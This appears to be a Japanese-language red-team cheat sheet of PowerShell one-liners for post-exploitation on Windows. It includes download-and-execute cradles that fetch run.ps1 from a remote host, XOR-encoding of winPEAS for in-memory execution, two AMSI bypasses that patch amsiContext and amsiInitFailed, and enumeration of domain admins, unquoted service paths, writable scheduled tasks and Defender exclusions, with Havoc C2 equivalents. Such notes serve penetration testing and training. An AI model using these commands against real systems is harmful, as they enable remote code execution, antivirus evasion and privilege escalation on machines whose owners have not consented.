# Powershell

## ダウンロード＋実行
```
$wc=New-Object System.Net.WebClient; $wc.DownloadString("URL") | IEX;
```

## 書き込み可能なフォルダ
```
$folders = Get-ChildItem -Path "C:\Windows" -Directory -Recurse -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName
foreach($folder in $folders) {icacls $folder | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\") -and ($_ -notmatch "NT SERVICE\\") -and ($_ -notmatch "CREATOR OWNER") -and ($_ -notmatch "BUILTIN\\Backup Operators") -and ($_ -notmatch "RESTRICTED SERVICES\\"))) {$folder; $_} }}
```

## バイナリファイル内の文字列ダンプ
```
$exeFilePath = "[EXEファイルのパス]"
$bytes = [System.IO.File]::ReadAllBytes($exeFilePath)
$chars = [System.Text.Encoding]::ASCII.GetString($bytes)
$strings = $chars -split "`0" | Where-Object { $_ -match "\w{4,}"}
$strings | ForEach-Object { Write-Output $_ }
```

## ユーザ
<details>
<summary>ユーザの確認</summary>
	
#### ドメインユーザの列挙
```
net user /domain
---
havoc:
domainenum
```

#### ローカルユーザの列挙
```
net users
Get-LocalUser
---
havoc:
userenum
```
#### Domain Adminsユーザの列挙
```
([adsisearcher]"(&(objectClass=user)(objectCategory=person))").FindAll() | ? { $_.Properties.memberof -match "CN=Domain Admins" } | % { $_.Properties.samaccountname }
---
havoc:
netGroupListMembers "Domain Admins"
```
#### ローカル管理者の列挙
```
Get-LocalGroupMember Administrators
---
havoc：
netLclGrpLstMmbrs administrators
```
#### ログインしているユーザ：
```
qwinsta
```
</details>

<details>
<summary>グループの確認</summary>

```
net localgroup
net group /domain
		
Get-DomainGroupMember -Identity [グループ名] -Server [DCホスト名]
Get-LocalGroupMember Administrators
```
</details>


## プロセス
<details>
<summary>プロセス一覧の表示</summary>
	
```
Get-WmiObject Win32_Process | where {$_.ProcessName -notlike "svchost*" } | select processid,name,@{Label="Owner";Expression={$_.GetOwner().User}},commandline | ft -AutoSize
		
Get-Process -IncludeUserName
```
</details>

<details>
<summary>インストールされているソフトウェアの確認</summary>
	
```
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
</details>

<details>
<summary>自動起動プロセスの確認</summary>

```
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
</details>

## サービス
- サービス一覧の表示：
```
Get-Service | ft -AutoSize
Get-WmiObject -Class Win32_Service |  ForEach-Object { "$($_.Name) : $($_.PathName)" }
```
		
- Unquated Pathの列挙：
```
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -notlike "*svchost*" } | ForEach-Object { if ($_.PathName -match '^(.*?\.exe)') {$matches[1]} }
```		

- 書き換え可能なUnquated Pathの列挙：
```
$services = Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notmatch '"' -and $_.PathName -notlike "*svchost*" } | ForEach-Object { if ($_.PathName -match '^(.*?\.exe)') {$matches[1]} }; 
foreach($service in $services) {icacls $service | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\SYSTEM") -and ($_ -notmatch "NT SERVICE\\TrustedInstaller"))) {$service; $_} }}
```

## タスク
- スケジュールタスクの列挙：
```
schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
			
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```			
	
- スケジュールタスクの詳細情報確認：
```
schtasks /query /tn [タスク名] /fo list /v
```
	
- スケジュールタスクの実行ユーザ＋バイナリ列挙：
```
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ForEach-Object {[PSCustomObject]@{TaskName=$_.TaskName;UserId=$_.Principal.UserId;Action=($_.Actions|ForEach-Object{$_.Execute})-join', ';Args=($_.Actions | ForEach-Object { $_.Arguments }) -join ', '}} | Format-Table -AutoSize

$tasknames = schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
$users = $tasknames | ForEach-Object { schtasks /query /tn "$_" /fo list /v } | Select-String "ユーザーとして実行" | ForEach-Object {($_ -split ": ")[1].Trim()}
$files = $tasknames | ForEach-Object { schtasks /query /tn "$_" /fo list /v } | Select-String "実行するタスク" | ForEach-Object {($_ -split ": ")[1].Trim()}
for($i=0; $i -lt $tasknames.Count; $i++){ [PSCustomObject]@{TaskName=$tasknames[$i]; User=$users[$i]; File=$files[$i]}}
```			

- タスクの起動トリガーの確認：
```
(Get-ScheduledTask -TaskName [タスク名]).Triggers
```

- 書き換え可能なスケジュールタスクの列挙：
```
$tasknames = schtasks /query /fo list /v | Select-String "タスク名" | ForEach-Object { ($_ -split ":")[1].Trim() | Where-Object {$_ -notmatch "\\Microsoft"} }
$runtasks = $tasknames | ForEach-Object { schtasks /query /tn "$_" /fo list /v } | Select-String "実行するタスク" | ForEach-Object {($_ -split ": ")[1].Trim()}
$filepath = $runtasks | ForEach-Object {if (($_ -match '^"?(.*?\.exe)') -or ($_ -match '^"?(.*?\.bat)') ) {$matches[1]} }
foreach($file in $filepath) {icacls $file | ForEach-Object { if((($_ -match "\(F\)") -or ($_ -match "\(M\)") -or ($_ -match "\(W\)")) -and (($_ -notmatch "Administrator") -and ($_ -notmatch "NT AUTHORITY\\SYSTEM"))) {$file; $_} }}
```

## ネットワーク
- プロキシ設定の確認：
```
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://192.168.119.120/run.ps1")
```

- SYSTEMユーザのプロキシ設定：
```
New-PSDrive -Name HKU -PSProvider Registry -Root HKEY_USERS | Out-Null
$keys = Get-ChildItem 'HKU:\'
ForEach ($key in $keys) {if ($key.Name -like "*S-1-5-21-*") {$start = $key.Name.substring(10);break}}
$proxyAddr=(Get-ItemProperty -Path "HKU:$start\Software\Microsoft\Windows\CurrentVersion\Internet Settings\").ProxyServer
[system.net.webrequest]::DefaultWebProxy = new-object System.Net.WebProxy("http://$proxyAddr")
$wc = new-object system.net.WebClient
$wc.DownloadString("http://192.168.119.120/run2.ps1")
```

- ユーザエージェントの設定：
```
$wc = new-object system.net.WebClient
$wc.Headers.Add('User-Agent', "This is my agent, there is no one like it...")
$wc.DownloadString("http://192.168.119.120/run.ps1")
```

## エンコード
- PowerShellスクリプトをXORエンコード：
```
# ダウンロードするスクリプトファイルのURL
$url = "https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1"

# WebClientオブジェクトを作成してファイルをダウンロード（テキストファイル）
$webClient = New-Object System.Net.WebClient
$fileContent = $webClient.DownloadString($url)

# XORキーの設定
$key = [System.Text.Encoding]::ASCII.GetBytes("testforyou")
$keyLength = $key.Length

# XORエンコード処理
$encodedContent = ""
for ($i = 0; $i -lt $fileContent.Length; $i++) {
    # 各文字をXOR演算で変換
    $encodedContent += [char]($fileContent[$i] -bxor $key[$i % $keyLength])
}
		
# エンコードされた内容をメモリに保持（ここでは文字列として保存）
$encodedContent | Out-File -FilePath wp.txt
```

- XORエンコードしたファイルをメモリにダウンロードし実行：
```
# エンコードされたスクリプトファイルのURL
$encodedUrl = "https://raw.githubusercontent.com/ishidanow/memo/refs/heads/main/wp.txt"

# エンコードされたスクリプトをダウンロード
$encodedContent = $webClient.DownloadString($encodedUrl)

# XORキーの設定（エンコード時と同じキー）
$key = [System.Text.Encoding]::ASCII.GetBytes("testforyou")
$keyLength = $key.Length

# XORデコード処理
$decodedContent = ""
for ($i = 0; $i -lt $encodedContent.Length; $i++) {
    # 各文字をXOR演算で復号
    $decodedContent += [char]($encodedContent[$i] -bxor $key[$i % $keyLength])
}

IEX $decodedContent
```

## AMSI
- amsiContextの書き換え
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);$ptr = [System.IntPtr]::Add([System.IntPtr]$g, 0x8);$buf = New-Object byte[](8);$replace = [System.Runtime.InteropServices.Marshal]; $replace::Copy($buf, 0, $ptr, 8)
```

- amsiInitFailedの書き換え
```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};
$f.SetValue($null,$true)
```

## AppLocker
- CLMのチェック：
```
$ExecutionContext.SessionState.LanguageMode
```
	
- AppLockerポリシーの確認：
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## AV
- 除外フォルダの列挙：
```
(Get-MpPreference).ExclusionPath
```
